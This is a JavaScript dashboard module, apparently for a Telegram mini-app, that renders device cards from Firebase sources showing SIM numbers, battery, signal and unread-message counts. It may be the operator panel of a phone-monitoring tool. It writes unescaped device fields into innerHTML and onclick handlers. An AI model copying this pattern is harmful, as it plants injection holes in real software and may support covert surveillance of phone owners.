/**
 * DASHBOARD MODULE
 * Handles dashboard rendering, device cards, filters, and stats
 */

// ────────────────────────────────────────────────
// STATE
// ────────────────────────────────────────────────

let currentFilter = 'all';
let displayedDevices = [];
let dashboardListeners = [];

// ────────────────────────────────────────────────
// RENDER DASHBOARD
// ────────────────────────────────────────────────

function renderDashboard(devices) {
    if (!devices) {
        devices = allDevices || [];
    }

    displayedDevices = devices;
    updateStats(devices);
    applyFilter(currentFilter);
}

function updateStats(devices) {
    const onlineCount = devices.filter(d => d.status === 'online').length;
    const totalCount = devices.length;
    const sourceCount = Object.keys(firebaseInstances).filter(id => firebaseInstances[id] && firebaseInstances[id].connected).length;

    document.getElementById('onlineCount').textContent = onlineCount;
    document.getElementById('totalCount').textContent = totalCount;
    document.getElementById('sourceCount').textContent = sourceCount;
}

function applyFilter(filter) {
    currentFilter = filter || currentFilter;
    let filtered = [...displayedDevices];

    if (currentFilter === 'online') {
        filtered = filtered.filter(d => d.status === 'online');
    } else if (currentFilter === 'offline') {
        filtered = filtered.filter(d => d.status === 'offline');
    }

    renderDeviceCards(filtered);
}

function renderDeviceCards(devices) {
    const grid = document.getElementById('devicesGrid');
    
    if (!grid) return;

    const sourceCount = Object.keys(firebaseInstances).filter(id => firebaseInstances[id] && firebaseInstances[id].connected).length;
    const configs = loadFirebaseConfigs();
    const totalSources = configs.sources ? configs.sources.length : 0;

    if (devices.length === 0) {
        let message = '';
        let icon = '📭';
        let details = '';

        if (totalSources === 0) {
            icon = '🔌';
            message = 'No Firebase Connected';
            details = 'Go to Admin Panel (⚙️) and add a Firebase source';
        } else if (sourceCount === 0) {
            icon = '❌';
            message = 'Firebase Connection Failed';
            details = 'Check your Firebase URL and Key in Admin Panel';
        } else if (sourceCount > 0) {
            icon = '📭';
            message = 'No Devices Found';
            details = `Connected to ${sourceCount} Firebase source(s) but no devices in "users" collection`;
        } else {
            icon = '⚠️';
            message = 'No Devices Found';
            details = 'Add devices to your Firebase "users" collection';
        }

        grid.innerHTML = `
            <div class="card" style="text-align:center; padding:40px 20px;">
                <div style="font-size:48px; margin-bottom:12px;">${icon}</div>
                <div style="font-size:18px; font-weight:600; color:var(--tg-theme-text-color,#000); margin-bottom:8px;">
                    ${message}
                </div>
                <div style="font-size:14px; color:var(--tg-theme-hint-color,#999);">
                    ${details}
                </div>
                <div style="margin-top:12px; font-size:12px; color:var(--tg-theme-hint-color,#999);">
                    Sources: ${sourceCount}/${totalSources} connected
                    ${sourceCount > 0 ? ` | Devices in DB: ${allDevices.length}` : ''}
                </div>
                <button onclick="refreshDashboard()" class="btn btn-primary" style="margin-top:16px;">
                    🔄 Refresh
                </button>
            </div>
        `;
        return;
    }

    grid.innerHTML = devices.map(device => `
        <div class="device-card" onclick="openDeviceDetail('${device.id}', '${device.sourceId}')">
            <div class="device-header">
                <div class="device-name">📱 ${device.name}</div>
                <span class="device-status ${device.status === 'online' ? 'status-online' : 'status-offline'}">
                    ${device.status === 'online' ? '🟢 Online' : '🔴 Offline'}
                </span>
            </div>
            <div class="device-details">
                <div class="device-detail-item">
                    <span class="label">📞</span>
                    ${device.sims && device.sims.length > 0 ? device.sims[0] : device.number}
                </div>
                <div class="device-detail-item">
                    <span class="label">📶</span> ${device.signal || 'N/A'}
                </div>
                <div class="device-detail-item">
                    <span class="label">🔋</span>
                    <div class="device-battery-wrap">
                        ${device.battery}%
                        <div class="battery-icon">
                            <div class="battery-level ${device.battery < 20 ? 'critical' : device.battery < 50 ? 'low' : ''}" 
                                 style="width: ${Math.min(device.battery, 100)}%"></div>
                        </div>
                    </div>
                </div>
                <div class="device-detail-item">
                    <span class="label">🕐</span> ${timeAgo(device.lastSeen)}
                </div>
                <div class="device-detail-item" style="grid-column: 1 / -1;">
                    <span class="label">📱</span> ${device.model || 'N/A'}
                </div>
                ${device.unread > 0 ? `
                <div class="device-detail-item" style="grid-column: 1 / -1; color: var(--tg-theme-button-color, #0088cc);">
                    💬 ${device.unread} new message${device.unread > 1 ? 's' : ''}
                </div>
                ` : ''}
            </div>
        </div>
    `).join('');
}

// ────────────────────────────────────────────────
// FILTER HANDLING
// ────────────────────────────────────────────────

function setupFilters() {
    const tabs = document.querySelectorAll('.filter-tab');
    tabs.forEach(tab => {
        tab.addEventListener('click', function() {
            const filter = this.dataset.filter;
            tabs.forEach(t => t.classList.remove('active'));
            this.classList.add('active');
            applyFilter(filter);
            hapticFeedback('light');
        });
    });
}

// ────────────────────────────────────────────────
// REFRESH
// ────────────────────────────────────────────────

async function refreshDashboard() {
    showLoading('Refreshing devices...');
    try {
        await initFirebaseConnections();
        await fetchAllDevices();
        renderDashboard(allDevices);
        
        const count = allDevices.length;
        const sources = Object.keys(firebaseInstances).filter(id => firebaseInstances[id] && firebaseInstances[id].connected).length;
        
        if (count === 0 && sources === 0) {
            showTelegramAlert('ℹ️ No Firebase sources configured. Add one in Admin Panel (⚙️)');
        } else if (count === 0 && sources > 0) {
            showTelegramAlert(`ℹ️ Connected to ${sources} Firebase source(s) but no devices found. Add devices to your "users" collection.`);
        } else {
            showTelegramAlert(`✅ Found ${count} devices from ${sources} source(s)`);
        }
    } catch (error) {
        console.error('Error refreshing dashboard:', error);
        showTelegramAlert(`❌ Failed to refresh: ${error.message || 'Unknown error'}`);
    } finally {
        hideLoading();
    }
}

// ────────────────────────────────────────────────
// LOADING INDICATOR
// ────────────────────────────────────────────────

function showLoading(text) {
    const overlay = document.getElementById('loadingOverlay');
    const loadingText = document.getElementById('loadingText');
    if (overlay) {
        overlay.classList.remove('hidden');
        if (loadingText) {
            loadingText.textContent = text || 'Loading...';
        }
    }
}

function hideLoading() {
    const overlay = document.getElementById('loadingOverlay');
    if (overlay) {
        overlay.classList.add('hidden');
    }
}

// ────────────────────────────────────────────────
// NAVIGATION
// ────────────────────────────────────────────────

async function showDashboard() {
    document.getElementById('loginScreen').classList.add('hidden');
    document.getElementById('dashboardView').classList.remove('hidden');
    document.getElementById('deviceDetailView').classList.remove('active');
    document.getElementById('deviceDetailView').classList.add('hidden');
    
    await updateAdminButtonVisibility();
    await loadDashboardData();
}

async function loadDashboardData() {
    showLoading('Connecting to Firebase...');
    try {
        await loadFirebaseConfigsFromFile();
        const connected = await initFirebaseConnections();
        
        if (!connected) {
            showLoading('No Firebase connected...');
            setTimeout(() => {
                hideLoading();
                renderDashboard([]);
                showTelegramAlert('ℹ️ No Firebase sources connected. Add one in Admin Panel (⚙️)');
            }, 1000);
            return;
        }
        
        showLoading('Fetching devices...');
        await fetchAllDevices();
        renderDashboard(allDevices);
        
        listenToDevices((devices) => {
            renderDashboard(devices);
        });
        
        const count = allDevices.length;
        const sources = Object.keys(firebaseInstances).filter(id => firebaseInstances[id] && firebaseInstances[id].connected).length;
        
        if (count === 0 && sources > 0) {
            showTelegramAlert(`ℹ️ Connected to ${sources} Firebase source(s) but no devices found.`);
        }
        
    } catch (error) {
        console.error('Error loading dashboard:', error);
        showTelegramAlert(`❌ Failed to load dashboard: ${error.message || 'Unknown error'}`);
        renderDashboard([]);
    } finally {
        hideLoading();
    }
}

function openDeviceDetail(deviceId, sourceId) {
    const device = allDevices.find(d => d.id === deviceId && d.sourceId === sourceId);
    if (!device) {
        showTelegramAlert('Device not found');
        return;
    }
    
    window.currentDeviceDetail = device;
    window.currentDeviceSourceId = sourceId;
    
    document.getElementById('dashboardView').classList.add('hidden');
    document.getElementById('deviceDetailView').classList.remove('hidden');
    document.getElementById('deviceDetailView').classList.add('active');
    
    if (window.initDeviceDetail) {
        window.initDeviceDetail(device, sourceId);
    }
}

// ────────────────────────────────────────────────
// EXPOSE TO GLOBAL SCOPE
// ────────────────────────────────────────────────

window.renderDashboard = renderDashboard;
window.updateStats = updateStats;
window.applyFilter = applyFilter;
window.renderDeviceCards = renderDeviceCards;
window.setupFilters = setupFilters;
window.refreshDashboard = refreshDashboard;
window.showLoading = showLoading;
window.hideLoading = hideLoading;
window.showDashboard = showDashboard;
window.loadDashboardData = loadDashboardData;
window.openDeviceDetail = openDeviceDetail;
